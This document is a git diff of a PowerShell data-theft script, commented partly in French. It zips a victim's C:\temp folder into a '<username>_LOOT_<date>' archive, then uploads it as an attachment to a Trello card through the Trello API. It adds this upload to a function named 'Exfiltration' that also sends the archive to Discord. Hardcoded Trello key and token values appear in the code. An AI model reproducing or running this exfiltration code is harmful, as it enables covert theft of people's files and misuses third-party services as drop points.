@@ -74,69 +74,69 @@ function Upload-Discord {
 }
 
 
-# Specify the username
+
+
+# Définir les variables globales pour le nom d'utilisateur et le chemin du fichier zip
 $username = $env:username
-
-# Specify the date format for the archive name
 $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
+$sourceDirectory = "C:\temp"
 
-# Specify the destination zip file path with username and date
-$zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
-$zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
-
-# Function to create a zip archive using Compress-Archive
 function ZipFiles {
-    # Specify the source directory
-    $sourceDirectory = "C:\temp"
+    # Specify the date format for the archive name
+    $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
+    $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
+
+    return $zipFilePath
 }
 
-# Create the zip file
-ZipFiles
+function UploadTrello {
+    # Replace the following values with your own
+    $name = "${username}_LOOT_${dateSansHeure}"
+    $idList = "65c269cf32172bbc68af098b"
+    $key = "e790f6a8afdd977c1ee4ccc549594c51"
+    $token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83D4CC8D"
 
-# Replace the following values with your own
-$name = "${username}_LOOT_${dateSansHeure}"
-$idList = "65c269cf32172bbc68af098b"
-$key = "e790f6a8afdd977c1ee4ccc549594c51"
-$token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83D4CC8D"
+    # URL de l'API Trello pour créer une carte
+    $url = "https://api.trello.com/1/cards"
 
-# URL de l'API Trello pour créer une carte
-$url = "https://api.trello.com/1/cards"
+    # Données JSON pour la création de la carte
+    $data = @{
+        "name" = $name
+        "idList" = $idList
+        "key" = $key
+        "token" = $token
+    }
 
-# Données JSON pour la création de la carte
-$data = @{
-    "name" = $name
-    "idList" = $idList
-    "key" = $key
-    "token" = $token
+    # Convertir les données JSON en chaîne
+    $jsonData = $data | ConvertTo-Json
+
+    # Envoi de la requête POST pour créer la carte et récupérer son ID
+    $response = Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $jsonData -UseBasicParsing
+
+    # Récupérer l'ID de la carte créée
+    $cardId = $response.id
+
+    # URL de l'API Trello pour ajouter une pièce jointe à la carte
+    $attachmentUrl = "https://api.trello.com/1/cards/$cardId/attachments"
+
+    # Appeler la fonction ZipFiles pour obtenir le chemin du fichier zip
+    $zipFilePath = ZipFiles
+
+    # Charger le fichier zip
+    $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
+
+    # Envoi de la requête POST avec le fichier zip comme pièce jointe
+    $response = Invoke-RestMethod -Uri $attachmentUrl -Method Post -InFile $zipFilePath -ContentType 'multipart/form-data' -Headers @{
+        "key" = $key
+        "token" = $token
+    }
+
+    # Afficher la réponse
+    $response
 }
-
-# Convertir les données JSON en chaîne
-$jsonData = $data | ConvertTo-Json
-
-# Envoi de la requête POST pour créer la carte et récupérer son ID
-$response = Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $jsonData -UseBasicParsing
-
-# Récupérer l'ID de la carte créée
-$cardId = $response.id
-
-# URL de l'API Trello pour ajouter une pièce jointe à la carte
-$attachmentUrl = "https://api.trello.com/1/cards/$cardId/attachments"
-
-# Charger le fichier zip
-$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
-
-# Construire le corps de la requête
-$body = @{
-    "key" = $key
-    "token" = $token
-    "file" = $fileContent
-}
-
-# Envoi de la requête POST pour ajouter le fichier zip comme pièce jointe à la carte
-$response = Invoke-WebRequest -Uri $attachmentUrl -Method Post -Body $body
 
 
 
@@ -170,6 +170,9 @@ function Exfiltration {
 
     #Call ZipFiles
     ZipFiles
+
+    #Call UploadTrello
+    UploadTrello
 
     # Call Upload-Discord
     Upload-Discord -file $zipFilePath -text "Treasure :"
